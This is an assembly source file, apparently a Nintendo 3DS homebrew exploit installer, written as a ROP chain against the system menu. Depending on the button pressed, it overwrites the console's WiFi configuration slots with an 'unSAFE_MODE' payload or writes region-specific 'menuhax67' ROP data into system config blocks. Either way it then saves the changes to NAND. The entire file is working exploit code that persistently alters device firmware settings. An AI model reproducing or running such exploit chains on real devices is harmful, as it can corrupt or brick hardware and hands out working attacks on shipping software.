.nds

.include "../build/constants.s"

.loadtable "unicode.tbl"

.create "menu_ropbin.bin",0x0

MENU_OBJECT_LOC equ MENU_LOADEDROP_BUFADR

.include "menu_include.s"

MENU_GARBAGE equ 0xDEADBABE

MENU_PAD equ 0x1000001C

MENU_WIFI_SLOTID equ 0x00080000
USMHAXX equ 0x58584148

.macro cfg_readSlot,block,data_buff,data_size
	set_lr MENU_NOP
	.word ROP_MENU_POP_R0PC
		.word data_buff
	.word ROP_MENU_POP_R1PC
		.word data_size
	.word ROP_MENU_POP_R2R3R4R5R6PC
		.word block
		.word MENU_GARBAGE
		.word MENU_GARBAGE
		.word MENU_GARBAGE
		.word MENU_GARBAGE
	.word ROP_MENU_CFGGETINFOBLOCK
	assert_success
.endmacro

.macro cfg_writeSlot,block,data_buff,data_size
	set_lr MENU_NOP
	.word ROP_MENU_POP_R0PC
		.word block
	.word ROP_MENU_POP_R1PC
		.word data_buff
	.word ROP_MENU_POP_R2R3R4R5R6PC
		.word data_size
		.word MENU_GARBAGE
		.word MENU_GARBAGE
		.word MENU_GARBAGE
		.word MENU_GARBAGE
	.word ROP_MENU_CFGSETINFOBLOCK
	assert_success
.endmacro

.macro cfg_updateSave
	set_lr MENU_NOP
	.word ROP_MENU_CFGUPDATENANDSAVE
	assert_success
.endmacro

.macro assert_success
	cond_jump_sp_r0 MENU_LOADEDROP_BUFADR + exitfailure, 0x00000000
.endmacro

.orga 0x0

	object:
	rop: ; real ROP starts here
		; Adquire screen rights for debug colors
		gsp_acquire_right

		; Set screen to blue
		writehwreg 0x202A04, 0x01FFFF00

		checkinputloop:
		cond_jump_sp MENU_LOADEDROP_BUFADR + checkinputloop2, MENU_PAD, (1<<10)
		jump_sp MENU_LOADEDROP_BUFADR + unsafemodeinstaller
		checkinputloop2:
		cond_jump_sp MENU_LOADEDROP_BUFADR + checkinputloop3, MENU_PAD, ((1<<11) | (1<<7))
		jump_sp MENU_LOADEDROP_BUFADR + menuhax67installer
		checkinputloop3:
		cond_jump_sp MENU_LOADEDROP_BUFADR + checkinputloop, MENU_PAD, (1<<3)
		jump_sp MENU_LOADEDROP_BUFADR + exit

		unsafemodeinstaller:
		; Read existing WIFI slots
		cfg_readSlot MENU_WIFI_SLOTID + 0, MENU_LOADEDROP_BUFADR + wifislotbuff1, 0xC00 
		cfg_readSlot MENU_WIFI_SLOTID + 1, MENU_LOADEDROP_BUFADR + wifislotbuff2, 0xC00
		cfg_readSlot MENU_WIFI_SLOTID + 2, MENU_LOADEDROP_BUFADR + wifislotbuff3, 0xC00

		; Check if word at slot1 + 0x420 is USM magic, if it is, USM is already installed so skip instalation, otherwise backup and install
		; Note: cond_jump_sp => if addr == value then not jump
		check_slot1:
		cond_jump_sp MENU_LOADEDROP_BUFADR + install_slot1, MENU_LOADEDROP_BUFADR + wifislotbuff1 + 0x420, USMHAXX
		jump_sp MENU_LOADEDROP_BUFADR + check_slot2
		install_slot1:
		memcpy MENU_LOADEDROP_BUFADR + wifislotbuff1 + 0x500, MENU_LOADEDROP_BUFADR + wifislotbuff1, 0x500, 0, 0
		memcpy MENU_LOADEDROP_BUFADR + wifislotbuff1, MENU_LOADEDROP_BUFADR + usmslot, 0x500, 0, 0

		; Same for slot2...
		check_slot2:
		cond_jump_sp MENU_LOADEDROP_BUFADR + install_slot2, MENU_LOADEDROP_BUFADR + wifislotbuff2 + 0x420, USMHAXX
		jump_sp MENU_LOADEDROP_BUFADR + check_slot3
		install_slot2:
		memcpy MENU_LOADEDROP_BUFADR + wifislotbuff2 + 0x500, MENU_LOADEDROP_BUFADR + wifislotbuff2, 0x500, 0, 0
		memcpy MENU_LOADEDROP_BUFADR + wifislotbuff2, MENU_LOADEDROP_BUFADR + usmslot, 0x500, 0, 0

		; Same for slot3...
		check_slot3:
		cond_jump_sp MENU_LOADEDROP_BUFADR + install_slot3, MENU_LOADEDROP_BUFADR + wifislotbuff3 + 0x420, USMHAXX
		jump_sp MENU_LOADEDROP_BUFADR + commit_config
		install_slot3:
		memcpy MENU_LOADEDROP_BUFADR + wifislotbuff3 + 0x500, MENU_LOADEDROP_BUFADR + wifislotbuff3, 0x500, 0, 0
		memcpy MENU_LOADEDROP_BUFADR + wifislotbuff3, MENU_LOADEDROP_BUFADR + usmslot, 0x500, 0, 0

		commit_config:
		; Store usm slot
		cfg_writeSlot MENU_WIFI_SLOTID + 0, MENU_LOADEDROP_BUFADR + wifislotbuff1, 0xC00
		cfg_writeSlot MENU_WIFI_SLOTID + 1, MENU_LOADEDROP_BUFADR + wifislotbuff2, 0xC00
		cfg_writeSlot MENU_WIFI_SLOTID + 2, MENU_LOADEDROP_BUFADR + wifislotbuff3, 0xC00
		; Update config save
		cfg_updateSave
		;exit
		jump_sp MENU_LOADEDROP_BUFADR + exitsuccess

		menuhax67installer:
		
		; Install the menuhax exploit to the corresponding config blocks
		cfg_readSlot 0x50001, MENU_LOADEDROP_BUFADR + menuhaxconfigbuff, 0x2
		storeb 0xE, MENU_LOADEDROP_BUFADR + menuhaxconfigbuff + 1
		cfg_writeSlot 0x50001, MENU_LOADEDROP_BUFADR + menuhaxconfigbuff, 0x2

		cfg_readSlot 0x50009, MENU_LOADEDROP_BUFADR + menuhaxconfigbuff, 0x8
		load_r0 MENU_LOADEDROP_BUFADR + menuhaxbaseaddr
		store_r0 MENU_LOADEDROP_BUFADR + menuhaxconfigbuff + 4
		cfg_writeSlot 0x50009, MENU_LOADEDROP_BUFADR + menuhaxconfigbuff, 0x8

		cfg_writeSlot 0xc0000, MENU_LOADEDROP_BUFADR + menuhaxrop, 0xC0
		; Update config save
		cfg_updateSave

		; jump_sp MENU_LOADEDROP_BUFADR + exitsuccess
		
		exitsuccess:
		; Notify install success
		writehwreg 0x202A04, 0x0100FF00
		; Sleep a bit
		sleep 2*1000*1000*1000, 0

		jump_sp MENU_LOADEDROP_BUFADR + exit

		exitfailure:
		; Notify install failed
		writehwreg 0x202A04, 0x010000FF
		; Sleep a bit
		sleep 2*1000*1000*1000, 0

		; jump_sp MENU_LOADEDROP_BUFADR + exit
	
		exit:
		; Clear screen
		writehwreg 0x202A04, 0x01000000
		; Sleep a bit
		sleep 1*1000*1000*1000, 0
		; Release screen rights
		gsp_release_right
		; Shutdown system
		nss_shutdown_async
		exit_process
		; 

	.align 0x10
	rebootdata:
		.fill 0x10, 0
	usmslot:
		.incbin "usmData/usm_slot1.data"
	menuhaxrop:
		.if REGION == "E"
			.incbin "menuhax67Data/rop_eur.data"
		.endif
		.if REGION == "U"
			.incbin "menuhax67Data/rop_usa.data"
		.endif
		.if REGION == "J"
			.incbin "menuhax67Data/rop_jpn.data"
		.endif
		.if REGION == "K"
			.incbin "menuhax67Data/rop_kor.data"
		.endif
	menuhaxbaseaddr:
		.if REGION == "E"
			.word 0x00347a10 + 0xA8
		.endif
		.if REGION == "U"
			.word 0x00346a10 + 0xA8
		.endif
		.if REGION == "J"
			.word 0x00347a10 + 0xA8
		.endif
		.if REGION == "K"
			.word 0x00346a10 + 0xA8
		.endif
	menuhaxconfigbuff:
	wifislotbuff1:
		.fill 0xC00, 0
	wifislotbuff2:
		.fill 0xC00, 0
	wifislotbuff3:
		.fill 0xC00, 0

.Close
